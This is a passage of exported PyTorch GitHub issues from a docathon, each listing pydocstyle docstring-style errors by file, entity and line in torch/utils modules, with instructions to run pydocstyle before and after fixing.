- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_set_main_datapipe_valid_iterator_id`, **Line**: 320, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_check_valid_iterator_id`, **Line**: 343, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `DemultiplexerIterDataPipe`, **Line**: 351, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `DemultiplexerIterDataPipe`, **Line**: 351, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `DemultiplexerIterDataPipe`, **Line**: 351, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_DemultiplexerIterDataPipe`, **Line**: 399, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_DemultiplexerIterDataPipe`, **Line**: 399, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `MultiplexerIterDataPipe`, **Line**: 534, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `MultiplexerIterDataPipe`, **Line**: 534, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `MultiplexerIterDataPipe`, **Line**: 534, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ZipperIterDataPipe`, **Line**: 599, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ZipperIterDataPipe`, **Line**: 599, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/fileopener.py`, **Entity**: `FileOpenerIterDataPipe`, **Line**: 15, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/fileopener.py`, **Entity**: `FileOpenerIterDataPipe`, **Line**: 15, **Description**: First line should end with a period (not 'm')
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `BatcherIterDataPipe`, **Line**: 31, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `BatcherIterDataPipe`, **Line**: 31, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `BatcherIterDataPipe`, **Line**: 31, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `UnBatcherIterDataPipe`, **Line**: 91, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `UnBatcherIterDataPipe`, **Line**: 91, **Description**: First line should end with a period (not 'l')
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `GrouperIterDataPipe`, **Line**: 143, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `GrouperIterDataPipe`, **Line**: 143, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `GrouperIterDataPipe`, **Line**: 143, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/datapipes/iter/selecting.py`, **Entity**: `FilterIterDataPipe`, **Line**: 21, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/sharding.py`, **Entity**: `ShardingFilterIterDataPipe`, **Line**: 30, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/sharding.py`, **Entity**: `ShardingFilterIterDataPipe`, **Line**: 30, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/iter/streamreader.py`, **Entity**: `StreamReaderIterDataPipe`, **Line**: 10, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/streamreader.py`, **Entity**: `StreamReaderIterDataPipe`, **Line**: 10, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/streamreader.py`, **Entity**: `StreamReaderIterDataPipe`, **Line**: 10, **Description**: First line should end with a period (not 'l')
- **File**: `torch/utils/data/datapipes/iter/utils.py`, **Entity**: `IterableWrapperIterDataPipe`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `validate_input_col`, **Line**: 26, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `validate_input_col`, **Line**: 26, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `_check_unpickable_fn`, **Line**: 127, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `_check_unpickable_fn`, **Line**: 127, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `_check_unpickable_fn`, **Line**: 127, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `StreamWrapper`, **Line**: 291, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `StreamWrapper`, **Line**: 291, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `StreamWrapper`, **Line**: 291, **Description**: First line should end with a period (not 'y')
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `close_streams`, **Line**: 316, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `autoclose`, **Line**: 352, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `autoclose`, **Line**: 352, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `handle_extension`, **Line**: 87, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `handle_extension`, **Line**: 87, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `handle_extension`, **Line**: 87, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `ImageHandler`, **Line**: 115, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `ImageHandler`, **Line**: 115, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `Decoder`, **Line**: 270, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/snapshot.py`, **Entity**: `_simple_graph_snapshot_restoration`, **Line**: 11, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/snapshot.py`, **Entity**: `_simple_graph_snapshot_restoration`, **Line**: 11, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/datapipes/utils/snapshot.py`, **Entity**: `_simple_graph_snapshot_restoration`, **Line**: 11, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/utils/data/datapipes/map/callable.py`, **Entity**: `MapperMapDataPipe`, **Line**: 20, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/callable.py`, **Entity**: `MapperMapDataPipe`, **Line**: 20, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/map/utils.py`, **Entity**: `SequenceWrapperMapDataPipe`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/combinatorics.py`, **Entity**: `ShufflerIterDataPipe`, **Line**: 15, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/combining.py`, **Entity**: `ConcaterMapDataPipe`, **Line**: 12, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/combining.py`, **Entity**: `ConcaterMapDataPipe`, **Line**: 12, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/map/combining.py`, **Entity**: `ZipperMapDataPipe`, **Line**: 58, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/combining.py`, **Entity**: `ZipperMapDataPipe`, **Line**: 58, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/map/grouping.py`, **Entity**: `BatcherMapDataPipe`, **Line**: 12, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/grouping.py`, **Entity**: `BatcherMapDataPipe`, **Line**: 12, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/map/grouping.py`, **Entity**: `BatcherMapDataPipe`, **Line**: 12, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/dataframe/structures.py`, **Entity**: `DataChunkDF`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/dataframe/structures.py`, **Entity**: `DataChunkDF`, **Line**: 8, **Description**: Docstring is over-indented
- **File**: `torch/utils/data/datapipes/dataframe/structures.py`, **Entity**: `DataChunkDF`, **Line**: 8, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/tensorboard/_convert_np.py`, **Entity**: ``, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/tensorboard/_convert_np.py`, **Entity**: `make_np`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_convert_np.py`, **Entity**: `make_np`, **Line**: 9, **Description**: First line should end with a period (not '

cc @carljparker",False
"Fix docstring errors in _hook_iterator.py, fetch.py, graph_settings.py, graph.py, distributed.py, gen_pyi.py, dataloader.py, signal_handling.py, collate.py, worker.py, dataset.py, sampler.py, _decorator.py, __init__.py, _typing.py, pin_memory.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/utils/data/graph.py`, **Entity**: `traverse_dps`, **Line**: 85, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/graph.py`, **Entity**: `traverse`, **Line**: 102, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/graph.py`, **Entity**: `traverse`, **Line**: 102, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/data/graph.py`, **Entity**: `traverse`, **Line**: 102, **Description**: First line should be in imperative mood; try rephrasing (found 'Deprecated')
- **File**: `torch/utils/data/graph_settings.py`, **Entity**: `apply_sharding`, **Line**: 50, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/graph_settings.py`, **Entity**: `apply_shuffle_settings`, **Line**: 88, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/graph_settings.py`, **Entity**: `apply_shuffle_settings`, **Line**: 88, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/data/graph_settings.py`, **Entity**: `apply_random_seed`, **Line**: 131, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/graph_settings.py`, **Entity**: `apply_random_seed`, **Line**: 131, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/data/dataloader.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/data/dataloader.py`, **Entity**: `_InfiniteConstantSampler`, **Line**: 83, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/dataloader.py`, **Entity**: `DataLoader`, **Line**: 124, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataloader.py`, **Entity**: `DataLoader`, **Line**: 124, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/dataloader.py`, **Entity**: `DataLoader`, **Line**: 124, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/data/dataloader.py`, **Entity**: `_MultiProcessingDataLoaderIter`, **Line**: 684, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/data/distributed.py`, **Entity**: `set_epoch`, **Line**: 128, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/distributed.py`, **Entity**: `set_epoch`, **Line**: 128, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/distributed.py`, **Entity**: `set_epoch`, **Line**: 128, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/utils/data/dataset.py`, **Entity**: `IterableDataset`, **Line**: 76, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataset.py`, **Entity**: `TensorDataset`, **Line**: 194, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataset.py`, **Entity**: `StackDataset`, **Line**: 215, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataset.py`, **Entity**: `ConcatDataset`, **Line**: 262, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataset.py`, **Entity**: `ChainDataset`, **Line**: 312, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataset.py`, **Entity**: `Subset`, **Line**: 339, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/sampler.py`, **Entity**: `SequentialSampler`, **Line**: 99, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/sampler.py`, **Entity**: `RandomSampler`, **Line**: 117, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/sampler.py`, **Entity**: `RandomSampler`, **Line**: 117, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/sampler.py`, **Entity**: `SubsetRandomSampler`, **Line**: 175, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/sampler.py`, **Entity**: `WeightedRandomSampler`, **Line**: 196, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/_utils/signal_handling.py`, **Entity**: ``, **Line**: 1, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/utils/data/_utils/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'y')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: ``, **Line**: 1, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'o')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_convert`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_convert`, **Line**: 21, **Description**: Docstring is over-indented
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_convert`, **Line**: 21, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_convert`, **Line**: 21, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `collate`, **Line**: 88, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `collate`, **Line**: 88, **Description**: Docstring is over-indented
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `collate`, **Line**: 88, **Description**: First line should end with a period (not 'h')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_collate`, **Line**: 205, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_collate`, **Line**: 205, **Description**: Docstring is over-indented
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_collate`, **Line**: 205, **Description**: First line should end with a period (not 'h')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_collate`, **Line**: 205, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/utils/data/_utils/fetch.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/fetch.py`, **Entity**: ``, **Line**: 1, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/utils/data/_utils/fetch.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'h')
- **File**: `torch/utils/data/_utils/pin_memory.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/pin_memory.py`, **Entity**: ``, **Line**: 1, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/utils/data/_utils/pin_memory.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/data/_utils/worker.py`, **Entity**: ``, **Line**: 1, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/utils/data/_utils/worker.py`, **Entity**: `get_worker_info`, **Line**: 90, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/worker.py`, **Entity**: `get_worker_info`, **Line**: 90, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/data/_utils/worker.py`, **Entity**: `get_worker_info`, **Line**: 90, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/data/datapipes/_decorator.py`, **Entity**: `__init__`, **Line**: 15, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_decorator.py`, **Entity**: `__init__`, **Line**: 15, **Description**: Docstring is over-indented
- **File**: `torch/utils/data/datapipes/_decorator.py`, **Entity**: `__init__`, **Line**: 15, **Description**: First line should end with a period (not '
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_SnapshotState`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_SnapshotState`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_simplify_obj_name`, **Line**: 21, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_generate_input_args_string`, **Line**: 35, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_check_iterator_valid`, **Line**: 68, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_set_datapipe_valid_iterator_id`, **Line**: 92, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `hook_iterator`, **Line**: 110, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `hook_iterator`, **Line**: 110, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `hook_iterator`, **Line**: 110, **Description**: First line should be in imperative mood; try rephrasing (found 'Hook')
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `IteratorDecorator`, **Line**: 121, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `IteratorDecorator`, **Line**: 121, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `IteratorDecorator`, **Line**: 121, **Description**: First line should end with a period (not 'o')
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_get_next`, **Line**: 138, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `issubtype`, **Line**: 52, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_issubtype_with_constraints`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_DataPipeType`, **Line**: 211, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_DataPipeType`, **Line**: 211, **Description**: First line should end with a period (not '`')
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_DataPipeMeta`, **Line**: 249, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_DataPipeMeta`, **Line**: 249, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_DataPipeMeta`, **Line**: 249, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_IterDataPipeMeta`, **Line**: 341, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_IterDataPipeMeta`, **Line**: 341, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `conditional_reset`, **Line**: 353, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `conditional_reset`, **Line**: 353, **Description**: First line should end with a period (not 'y')
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `reinforce_type`, **Line**: 414, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `reinforce_type`, **Line**: 414, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `find_file_paths`, **Line**: 31, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_method_name`, **Line**: 45, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_method_name`, **Line**: 45, **Description**: First line should end with a period (not '""')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_method_name`, **Line**: 45, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_class_name`, **Line**: 59, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_class_name`, **Line**: 59, **Description**: First line should end with a period (not '""')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_class_name`, **Line**: 59, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `parse_datapipe_file`, **Line**: 69, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `split_outside_bracket`, **Line**: 131, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `process_signature`, **Line**: 152, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `process_signature`, **Line**: 152, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `get_method_definitions`, **Line**: 178, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `get_method_definitions`, **Line**: 178, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `main`, **Line**: 228, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `main`, **Line**: 228, **Description**: First line should end with a period (not 'n')

cc @carljparker",False
"Fix docstring errors in backend_registration.py, _pytree.py, _foreach_utils.py, flop_counter.py, collect_env.py, checkpoint.py, cpp_extension.py, _python_dispatch.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/utils/collect_env.py`, **Entity**: `run`, **Line**: 51, **Description**: First line should end with a period (not ')')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run`, **Line**: 51, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_read_all`, **Line**: 67, **Description**: First line should end with a period (not '0')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_read_all`, **Line**: 67, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_parse_first_match`, **Line**: 75, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_parse_first_match`, **Line**: 75, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_return_first_line`, **Line**: 85, **Description**: First line should end with a period (not 'y')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_return_first_line`, **Line**: 85, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_cudnn_version`, **Line**: 156, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_cudnn_version`, **Line**: 156, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_pip_packages`, **Line**: 376, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_pip_packages`, **Line**: 376, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_pip_packages`, **Line**: 376, **Description**: First line should end with a period (not 'h')
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_pip_packages`, **Line**: 376, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_find_cuda_home`, **Line**: 91, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_find_cuda_home`, **Line**: 91, **Description**: First line should be in imperative mood (perhaps 'Find', not 'Finds')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_find_rocm_home`, **Line**: 121, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_find_rocm_home`, **Line**: 121, **Description**: First line should be in imperative mood (perhaps 'Find', not 'Finds')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_join_rocm_home`, **Line**: 146, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_join_rocm_home`, **Line**: 146, **Description**: First line should be in imperative mood (perhaps 'Join', not 'Joins')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `get_default_build_root`, **Line**: 263, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `get_default_build_root`, **Line**: 263, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `check_compiler_ok_for_platform`, **Line**: 278, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `check_compiler_ok_for_platform`, **Line**: 278, **Description**: First line should be in imperative mood (perhaps 'Verify', not 'Verifies')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `get_compiler_abi_compatibility_and_version`, **Line**: 319, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `get_compiler_abi_compatibility_and_version`, **Line**: 319, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `get_compiler_abi_compatibility_and_version`, **Line**: 319, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `BuildExtension`, **Line**: 430, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `with_options`, **Line**: 457, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `with_options`, **Line**: 457, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `with_options`, **Line**: 457, **Description**: First line should end with a period (not 'd')
